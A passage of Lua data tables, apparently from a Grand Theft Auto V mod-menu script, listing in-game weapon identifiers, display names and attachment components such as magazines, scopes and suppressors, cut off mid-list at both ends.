Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}}}},AssaultSMG={id="weapon_assaultsmg",name="~r~> ~s~Assault SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},CombatPDW={id="weapon_combatpdw",name="~r~> ~s~Combat PDW",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPDW_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPDW_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMBATPDW_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MachinePistol={id="weapon_machinepistol",name="~r~> ~s~Machine Pistol ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_03"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},MiniSMG={id="weapon_minismg",name="~r~> ~s~Mini SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MINISMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MINISMG_CLIP_02"}}}},UnholyHellbringer={id="weapon_raycarbine",name="~r~> ~s~Unholy Hellbringer",bInfAmmo=false,mods={}}},Shotguns={PumpShotgun={id="weapon_pumpshotgun",name="~r~> ~s~Pump Shotgun",bInfAmmo=false,mods={Flashlight={{"name = Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP"}}}},PumpShotgunMkII={id="weapon_pumpshotgun_mk2",name="~r~> ~s~Pump Shotgun Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},{name="~r~> ~s~Dragon Breath Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Steel Buckshot Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~Flechette Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~Explosive Slugs",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"}}}},SawedOffShotgun={id="weapon_sawnoffshotgun",name="~r~> ~s~Sawed-Off Shotgun",bInfAmmo=false,mods={}},AssaultShotgun={id="weapon_assaultshotgun",name="~r~> ~s~Assault Shotgun",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupShotgun={id="weapon_bullpupshotgun",name="~r~> ~s~Bullpup Shotgun",bInfAmmo=false,mods={Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},Musket={id="weapon_musket",name="~r~> ~s~Musket",bInfAmmo=false,mods={}},HeavyShotgun={id="weapon_heavyshotgun",name="~r~> ~s~Heavy Shotgun",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},DoubleBarrelShotgun={id="weapon_dbshotgun",name="~r~> ~s~Double Barrel Shotgun",bInfAmmo=false,mods={}},SweeperShotgun={id="weapon_autoshotgun",name="~r~> ~s~Sweeper Shotgun",bInfAmmo=false,mods={}}},AssaultRifles={AssaultRifle={id="weapon_assaultrifle",name="~r~> ~s~Assault Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},AssaultRifleMkII={id="weapon_assaultrifle_mk2",name="~r~> ~s~Assault Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_AR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_AR_BARREL_0"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},CarbineRifle={id="weapon_carbinerifle",name="~r~> ~s~Carbine Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_CLIP_02"},{name="~r~> ~s~Box Magazine",id="COMPONENT_CARBINERIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CarbineRifleMkII={id="weapon_carbinerifle_mk2",name="~r~> ~s~Carbine Rifle Mk II ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_CR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_CR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},AdvancedRifle={id="weapon_advancedrifle",name="~r~> ~s~Advanced Rifle ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}}}},SpecialCarbine={id="weapon_specialcarbine",name="~r~> ~s~Special Carbine",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},SpecialCarbineMkII={id="weapon_specialcarbine_mk2",name="~r~> ~s~Special Carbine Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SC_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SC_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},BullpupRifle={id="weapon_bullpuprifle",name="~r~> ~s~Bullpup Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupRifleMkII={id="weapon_bullpuprifle_mk2",name="~r~> ~s~Bullpup Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_BP_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_BP_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CompactRifle={id="weapon_compactrifle",name="~r~> ~s~Compact Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_03"}}}}},LMG={MG={id="weapon_mg",name="~r~> ~s~MG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL_02"}}}},CombatMG={id="weapon_combatmg",name="~r~> ~s~Combat MG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CombatMGMkII={id="weapon_combatmg_mk2",name="~r~> ~s~Combat MG Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MG_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MG_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},GusenbergSweeper={id="weapon_gusenberg",name="~r~> ~s~GusenbergSweeper",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_GUSENBERG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_GUSENBERG_CLIP_02"}}}}},Snipers={SniperRifle={id="weapon_sniperrifle",name="~r~> ~s~Sniper Rifle",bInfAmmo=false,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},HeavySniper={id="weapon_heavysniper",name="~r~> ~s~Heavy Sniper",bInfAmmo=false,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}}}},HeavySniperMkII={id="weapon_heavysniper_mk2",name="~r~> ~s~Heavy Sniper Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},{name="~r~> ~s~Explosive Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_MK2"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"},{name="~r~> ~s~Nigt Vision Scope",id="COMPONENT_AT_SCOPE_NV"},{name="~r~> ~s~Thermal Scope",id="COMPONENT_AT_SCOPE_THERMAL"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"},{name="~r~> ~s~Bell-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_09"}}}},MarksmanRifle={id="weapon_marksmanrifle",name="~r~> ~s~Marksman Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MarksmanRifleMkII={id="weapon_marksmanrifle_mk2",name="~r~> ~s~Marksman Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MRFL_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MRFL_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}}},Heavy={RPG={id="weapon_rpg",name="~r~> ~s~RPG",bInfAmmo=false,mods={}},GrenadeLauncher={id="weapon_grenadelauncher",name="~r~> ~s~Grenade Launcher",bInfAmmo=false,mods={}},GrenadeLauncherSmoke={id="weapon_grenadelauncher_smoke",name="~r~> ~s~Grenade Launcher Smoke",bInfAmmo=false,mods={}},Minigun={id="weapon_minigun",name="~r~> ~s~Minigun",bInfAmmo=false,mods={}},FireworkLauncher={id="weapon_firework",name="~r~> ~s~Firework Launcher",bInfAmmo=false,mods={}},Railgun={id="weapon_railgun",name="~r~> ~s~Railgun",bInfAmmo=false,mods={}},HomingLauncher={id="weapon_hominglauncher",name="~r~> ~s~Homing Launcher",bInfAmmo=false,mods={}},CompactGrenadeLauncher={id="weapon_compactlauncher",name="~r~> ~s~Compact Grenade Launcher",bInfAmmo=false,mods={}},Widowmaker={id="weapon_rayminigun",name="~r~> ~s~Widowmaker",bInfAmmo=false,mods={}}},Throwables={Grenade={id="weapon_grenade",name="~r~> ~s~Grenade",bInfAmmo=false,mods={}},BZGas={id="weapon_bzgas",name="~r~> ~s~BZ Gas",bInfAmmo=false,mods={}},MolotovCocktail={id="weapon_molotov",name="~r~> ~s~Molotov Cocktail",bInfAmmo=false,mods={}},StickyBomb={id="weapon_stickybomb",name="~r~> ~s~Sticky Bomb",bInfAmmo=false,mods={}},ProximityMines={id="weapon_proxmine",name="~r~> ~s~Proximity Mines",bInfAmmo=false,mods={}},Snowballs={id="weapon_snowball",name="~r~> ~s~Snowballs",bInfAmmo=false,mods={}},PipeBombs={id="weapon_pipebomb",name="~r~> ~s~Pipe Bombs",bInfAmmo=false,mods={}},Baseball={id="weapon_ball",name="~r~> ~s~Baseball",bInfAmmo=false,mods={}},TearGas={id="weapon_smokegrenade",name="~r~> ~s~Tear Gas",bInfAmmo=false,mods={}},Flare={id="weapon_flare",name="~r~> ~s~Flare",bInfAmmo=false,mods={}}},Misc={Parachute={id="gadget_parachute",name="~r~> ~s~Parachute",bInfAmmo=false,mods={}},FireExtinguisher={id="weapon_fireextinguisher",name="~r~> ~s~Fire Extinguisher",bInfAmmo=false,mods={}}}}
    allweaponsped = {
      "WEAPON_UNARMED",
      "WEAPON_KNIFE",
      "WEAPON_KNUCKLE",
      "WEAPON_NIGHTSTICK",
      "WEAPON_HAMMER",
      "WEAPON_BAT",
      "WEAPON_GOLFCLUB",
      "WEAPON_CROWBAR",
      "WEAPON_BOTTLE",
      "WEAPON_DAGGER",
      "WEAPON_HATCHET",
      "WEAPON_MACHETE",
      "WEAPON_FLASHLIGHT",
      "WEAPON_SWITCHBLADE",
      "WEAPON_POOLCUE",
      "WEAPON_PIPEWRENCH",
      
  
      "WEAPON_GRENADE",
      "WEAPON_STICKYBOMB",
      "WEAPON_PROXMINE",
      "WEAPON_BZGAS",
      "WEAPON_SMOKEGRENADE",
      "WEAPON_MOLOTOV",
